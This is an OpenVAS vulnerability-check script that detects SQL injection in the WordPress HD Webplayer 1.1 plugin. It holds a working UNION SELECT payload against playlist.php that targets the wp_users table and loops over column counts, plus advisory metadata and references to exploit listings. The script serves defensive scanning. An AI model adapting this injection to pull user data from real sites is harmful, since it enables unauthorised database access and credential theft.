###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_hd_webplayer_plugin_mult_sql_inj_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# WordPress HD Webplayer Plugin Multiple SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to manipulate SQL queries
  by injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "Wordpress HD Webplayer version 1.1";
tag_insight = "The input passed via the 'id' parameter to
  wp-content/plugins/webplayer/config.php and the 'videoid' parameter to
  wp-content/plugins/webplayer/playlist.php is not properly sanitised before
  being used in a SQL query.";
tag_solution = "No solution or patch is available as of 31st August, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.hdwebplayer.com/?q=wordpress-features";
tag_summary = "This host is running WordPress with HD Webplayer and is prone to
  multiple SQL injection vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.903039";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_bugtraq_id(55259);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-08-31 11:50:18 +0530 (Fri, 31 Aug 2012)");
  script_name("WordPress HD Webplayer Plugin Multiple SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/50466/");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/78119");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20918/");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/50466");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/116011/wphdwebplayer-sql.txt");

  script_description(desc);
  script_summary("Check if WordPress HD Webplayer plugin is vulnerable to SQL injection attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
port = 0;
dir = "";
url = "";
exploit = "";
players = "";
player = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Iterate over players dir
players = make_list("webplayer", "hd-webplayer");

foreach player(players)
{
  url = dir + '/wp-content/plugins/' + player + '/playlist.php?videoid=1+' +
              '/*!UNION*/+/*!SELECT*/+group_concat'+
              '(ID,0x3a,0x4f70656e564153,0x3a,0x4f70656e564153,0x3b),2,3,4';

  ## Number of columns may be different
  ## Considering columns till 15
  for(i=5; i<=15; i++)
  {
    url = url + ',' + i;

    ## Construct the attack request
    exploit = url + '+from+wp_users';

    if(http_vuln_check(port:port, url:exploit,
                       pattern:">[0-9]+:OpenVAS:OpenVAS", check_header:TRUE,
                       extra_check:make_list("<playlist>", "hdwebplayer.com")))
    {
      security_hole(port);
      exit(0);
    }
  }
}
